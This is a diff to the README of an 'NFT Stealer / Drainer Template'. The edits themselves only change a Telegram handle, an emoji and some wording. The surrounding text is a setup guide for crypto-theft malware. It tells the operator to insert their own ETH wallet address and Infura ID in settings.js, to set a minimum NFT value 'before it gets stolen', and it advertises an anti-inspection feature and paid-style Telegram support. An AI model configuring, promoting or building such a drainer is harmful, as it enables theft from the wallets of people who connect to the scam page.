@@ -1,4 +1,4 @@
-### ⚠️ If you need any help, DM me here: [@NFTMontana](https://t.me/zentoh)
+### ⚠️ If you need any help, DM me here: [@Zentoh](https://t.me/zentoh)
 
 ## 🖼️ NFT Stealer / Drainer Template
 
@@ -14,7 +14,7 @@
 - [x] Anti F12 Inspect
 
 
-# 🖍️ Setup Guide: 
+# ✏️ Setup Guide: 
 you need to edit the **settings.js** file. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 - line 2: const infuraId = `"APP ID";` replace **APP ID with your Infura ID**
@@ -29,7 +29,7 @@ you need to edit the **settings.js** file.
 - Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
 - Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
 
-To get instant support, contact me on my [Telegram](https://t.me/zentoh)
+To get instant support, contact me on [Telegram](https://t.me/zentoh)
 
 # 👻 Why it doesn't show my address?
 
